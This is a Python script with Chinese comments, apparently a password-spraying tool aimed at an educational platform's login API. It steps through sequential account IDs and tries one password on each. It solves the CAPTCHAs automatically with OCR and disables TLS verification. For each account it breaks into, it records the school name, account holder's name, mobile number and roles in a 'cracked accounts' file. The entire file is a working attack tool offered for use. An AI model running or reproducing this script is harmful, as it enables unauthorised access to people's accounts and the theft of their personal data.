import requests
import time
import json
import os
import re
from alive_progress import alive_bar
import ddddocr
from termcolor import colored
import onnxruntime as ort
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import threading

# 设置 ONNX Runtime 的日志级别为 ERROR
ort.set_default_logger_severity(3)  # 3 = ERROR, 2 = WARNING, 1 = INFO, 0 = VERBOSE

# 配置
base_url = "https://www.XXX.com"
captcha_url = f"{base_url}/api/account/captcha"
login_url = f"{base_url}/api/account/login"
workbench_url = f"{base_url}/workbench"
change_role_url = f"{base_url}/api/account/changeRole"
logout_url = f"{base_url}/logout"

# 创建目录和文件
os.makedirs("output", exist_ok=True)
questionable_accounts_file = "output/questionable_accounts.txt"
failed_accounts_file = "output/failed_accounts.txt"
cracked_accounts_file = "output/cracked_accounts.txt"

# 获取用户输入
start_account = input("请输入起始账号: ")
end_account = input("请输入结束账号: ")
password = input("请输入密码: ")
interval = int(input("请输入每次发送登录表单间隔时间（秒）: "))

# 初始化验证码识别器
ocr = ddddocr.DdddOcr(show_ad=False)

# 工具函数
def save_captcha_image(image_content, username):
    image_path = f"output/captcha_{username}.png"
    with open(image_path, "wb") as f:
        f.write(image_content)
    return image_path

def delete_captcha_image(image_path):
    if os.path.exists(image_path):
        os.remove(image_path)

def save_account_info(filename, info):
    with open(filename, "a") as f:
        f.write(info + "\n")

def extract_role_ids(html):
    role_ids = re.findall(r"roleChange\((\d+)\)", html)
    return list(set(role_ids))

def handle_success_login(cookies, account):
    response = requests.get(workbench_url, cookies=cookies)
    role_ids = extract_role_ids(response.text)
    role_names = set()
    school_name = account_name = mobile_num = ""

    for role_id in role_ids:
        data = {"accountRoleId": role_id}
        role_response = requests.post(change_role_url, data=data, cookies=cookies).json()
        if role_response["code"] == 200:
            data = role_response["data"]
            school_name = data["schoolName"]
            account_name = data["accountName"]
            mobile_num = data["mobileNum"]
            role_names.add(data["roleName"])

    save_account_info(cracked_accounts_file, f"{account},{school_name},{account_name},{mobile_num},{','.join(role_names)}")
    return school_name, role_names

def requests_retry_session(retries=5, backoff_factor=0.3, status_forcelist=(500, 502, 504), session=None):
    session = session or requests.Session()
    retry = Retry(
        total=retries,
        read=retries,
        connect=retries,
        backoff_factor=backoff_factor,
        status_forcelist=status_forcelist,
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def main():
    total_accounts = int(end_account[1:]) - int(start_account[1:]) + 1
    with alive_bar(total_accounts, title=f"运行中 ({start_account} - {end_account},Password: {password})") as bar:
        for i in range(int(start_account[1:]), int(end_account[1:]) + 1):
            account = f"T{i:08d}"
            captcha_verified = False
            while not captcha_verified:
                try:
                    # 获取验证码
                    captcha_response = requests_retry_session().get(captcha_url, verify=False)
                    captcha_image = captcha_response.content
                    captcha_key = captcha_response.cookies["HxxAI_Captcha_Key"]

                    # 识别验证码
                    captcha_code = ocr.classification(captcha_image)

                    # 登录请求
                    cookies = {
                        "web_msid": "random_value",  # 生成实际需要的随机cookie
                        "HxxAI_Captcha_Key": captcha_key
                    }
                    data = {
                        "userName": account,
                        "password": password,
                        "captchaVerifyParam": captcha_code
                    }
                    login_response = requests_retry_session().post(login_url, data=data, cookies=cookies, verify=False).json()

                    # 处理响应
                    if login_response["yzcode"] == 500:
                        status = "疑问账号"
                        print(colored(f"账号 {account}：验证码校验失败，重新尝试中ing...", "yellow"))
                        print(colored(f"请求体：{json.dumps(data, ensure_ascii=False)}", "grey"))
                        print(colored(f"响应体：{json.dumps(login_response, ensure_ascii=False)}", "grey"))
                        #image_path = save_captcha_image(captcha_image, account)
                        #print(f"验证码图片已保存到 {image_path}")
                        
                        # 获取用户输入验证码
                        user_input = 1
                        #delete_captcha_image(image_path)  # 删除验证码图片
                        if user_input == '0':
                            save_account_info(questionable_accounts_file, account)
                            break
                        captcha_code = user_input
                    elif login_response["code"] == 500 and login_response["yzcode"] == 200:
                        status = "失败或空账号"
                        print(colored(f"账号 {account}：密码错误或空账号", "grey"))
                        print(colored(f"请求体：{json.dumps(data, ensure_ascii=False)}", "grey"))
                        print(colored(f"响应体：{json.dumps(login_response, ensure_ascii=False)}", "grey"))
                        save_account_info(failed_accounts_file, account)
                        captcha_verified = True
                    elif login_response["code"] == 200:
                        status = "已破解账号"
                        school_name, role_names = handle_success_login(cookies, account)
                        print(colored(f"账号 {account}：已破解账号", "green"))
                        print(colored(f"学校名称：{school_name}，角色：{', '.join(role_names)}", "green"))
                        captcha_verified = True

                    time.sleep(interval)
                except requests.exceptions.RequestException as e:
                    print(colored(f"账号 {account}：请求失败，错误信息：{str(e)}", "red"))
                    time.sleep(interval)
            bar()

if __name__ == "__main__":
    main()
